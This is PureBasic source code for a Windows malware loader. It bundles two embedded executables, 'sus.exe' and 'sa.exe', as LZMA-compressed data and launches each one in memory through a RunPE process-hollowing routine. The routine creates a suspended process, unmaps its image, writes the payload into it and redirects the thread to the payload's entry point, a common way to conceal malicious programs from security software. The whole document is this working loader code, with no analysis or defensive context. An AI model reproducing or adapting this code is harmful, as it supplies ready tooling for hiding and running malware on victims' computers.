



  
DataSection
  start: 
  IncludeBinary "sus.exe" 
  wf:
  IncludeBinary "sa.exe"
  finish:
EndDataSection
 
  
UseLZMAPacker()
 
 Procedure RunPE(lBuff, parameters.s) 
  Protected *idh.IMAGE_DOS_HEADER  = lBuff 
  Protected *ish.IMAGE_SECTION_HEADERS 
  Protected pi.PROCESS_INFORMATION 
  Protected *inh.IMAGE_NT_HEADERS 
  Protected si.STARTUPINFO 
  Protected lpBaseAddres.l 
  Protected Ctx.CONTEXT 
  Protected Addr.l, RET.l, i.l 

  CreateProcess_(#NUL, ProgramFilename() + " " + parameters, #NUL, #NUL, #False, #CREATE_SUSPENDED | #CREATE_NEW_PROCESS_GROUP, #NUL, #NUL, @si, @pi) 
  Ctx\ContextFlags = #CONTEXT_INTEGER 
  If GetThreadContext_(pi\hThread, Ctx) = 0      : Goto EndThread : EndIf 

  ReadProcessMemory_(pi\hProcess, Ctx\Ebx + 8, @Addr, 4, #NUL) 
  If ZwUnmapViewOfSection_(Pi\hProcess, Addr)    : Goto EndThread : EndIf 
  If lBuff = 0                                   : Goto EndThread : EndIf 
  *inh = lBuff + *idh\e_lfanew 

  lpBaseAddres = VirtualAllocEx_(pi\hProcess, *inh\OptionalHeader\ImageBase, *inh\OptionalHeader\SizeOfImage, #MEM_COMMIT | #MEM_RESERVE, #PAGE_EXECUTE_READWRITE) 
  WriteProcessMemory_(pi\hProcess, lpBaseAddres, lBuff, *inh\OptionalHeader\SizeOfHeaders, @ret) 
  *ish = *inh\OptionalHeader + *inh\FileHeader\SizeOfOptionalHeader 

  For i = 0 To *inh\FileHeader\NumberOfSections - 1 
    WriteProcessMemory_(pi\hProcess, lpBaseAddres + *ish\ish[i]\VirtualAddress, lBuff + *ish\ish[i]\PointerToRawData, *ish\ish[i]\SizeOfRawData, @ret) 
  Next 

  WriteProcessMemory_(pi\hProcess, Ctx\Ebx + 8, @lpBaseAddres, 4, #NUL) 
  Ctx\Eax = lpBaseAddres + *inh\OptionalHeader\AddressOfEntryPoint 
  SetThreadContext_(pi\hThread, Ctx) 
  ResumeThread_(pi\hThread) 
  WaitForSingleObject_(pi\hProcess, #INFINITE)
  ProcedureReturn 

  EndThread: 
  TerminateProcess_(pi\hProcess, #NUL) 
  CloseHandle_(pi\hThread) 
  CloseHandle_(pi\hProcess) 
EndProcedure 
 
 


Procedure StartExe(theexe, arg.s)
  size=PeekL(theexe)
*Mem = AllocateMemory(size)
If *Mem
  bytesUnpacked = UncompressMemory(theexe+4, (?finish-theexe)+4, *Mem, size, #PB_PackerPlugin_Lzma)
  RunPE(*Mem, "")
   
EndIf
  EndProcedure




Procedure Main()

 
  StartExe(?start, "")
  StartExe(?wf, "")

     
     
   




EndProcedure

main()


; IDE Options = PureBasic 6.00 LTS (Windows - x86)
; CursorPosition = 76
; FirstLine = 8
; Folding = -
; Optimizer
; EnableThread
; DPIAware
; Executable = baka.exe